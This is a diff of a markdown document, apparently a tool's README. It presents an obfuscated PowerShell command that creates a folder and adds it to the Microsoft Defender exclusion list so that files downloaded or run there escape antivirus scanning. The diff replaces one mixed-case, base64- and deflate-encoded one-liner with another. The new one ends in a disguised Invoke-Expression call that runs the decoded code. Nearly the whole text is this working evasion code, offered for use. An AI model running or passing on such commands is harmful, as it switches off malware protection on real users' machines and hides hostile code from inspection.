@@ -28,7 +28,8 @@ This directory that is created will be added to the Microsoft Defender Exclusion
 Any files downloaded or ran from here will be ignored by the anti virus
 
 ```
-iNVOke-ExpResSion (NEw-oBjECt  SysTem.Io.COmPreSSioN.dEFLaTESTrEaM( [SySTeM.IO.MEmorysTReAm][SYstEm.COnvERT]::frOMBasE64sTrINg('hZBPT8JAFMS/yqbhWsBIvBAOsxVao5UsDURIL/3z2KotbbrFqp/efSUmnvD0drIzvze7o6zKxUI4qZItfIVEyS94gOpxh1WPnZLf8LfItJ1WW18DP0QCWbDeQH6wzpXs2JdqOUUQ4gWcW+KgZYl7A6XkO/OflHxGAGxh91j/cB884KDkmTkHBQ1vio2SM9Yp5A3zbC+7Z8a5AoHtCetbhlhrmWFl+/UXjp0Z/Cn73+Br7JXVS4W0tzrYcv+SOTku77H+Av6e9y6c+Wgd+gunqXtqTUFlOaZPEi6dMjHif3LmLWmR5PYUPHrbOKqPXZ+0FHtlYgyZeFxXOo44Ga8bOsVZXVXJKXfEJBfMFpPjf4jKuIa67vWkTeyd2x21Q9phtMP5Y53bBQ21XG4edUnbuVFJ1AjXiNsBn1NJHV0t6fxWue7922aI/AA='),[sYStem.Io.comPreSsiOn.CoMpREssiOnMode]::DEcomPResS )|fOReaCh{ NEw-oBjECt sYStEm.iO.STrEamrEaDeR( $_ , [syStEM.texT.eNCOdiNG]::AsciI ) }| fOreAch{$_.reAdToENd( )})
+$Payload = "JABwAGEAdABoAD0AIgAkAEUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAGMAdQBtAGUAbgB0AHMAXABzAGEAZgBlACIAOwBtAGsAZABpAHIAIAAkAHAAYQB0AGgAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABwAGEAdABoAA=="
+( nEw-obJECt Io.cOMprEssion.dEfLAtEStreAM([iO.MEMoRysTream][coNVerT]::FrOMBasE64sTring( 'hY69CsIwFEZf5RK6ph0ci1MHBZEKQacsoflahfyRRKpvb1MQnOp2h3vOd6r+fNiz4GfEdIcxNV4gDjdQdVFv45Um1kZMpPRyHU/dVQo/5llFyM6olJBk7e0kRaFlH+Dk4K1VTjNqNFWLn5rxn8ImnpDzw01Jds94Q1xpVtSs8KPXy0BALIGtyCpmLgwQiCfarXoNg4zNSPZN2f79rVmRDw=='), [SySTEM.Io.cOmprEsSION.comprEsSiOnmOdE]::DECoMPress )| ForeAch{ nEw-obJECt IO.stReaMReAdEr( $_, [SYSTEm.TEXT.encODINg]::aSciI ) } |ForEaCh { $_.rEAdtoENd() } )|& ( $VeRBosEPreFEreNcE.tosTRING()[1,3]+'x'-joIN'')
 
 ```
 
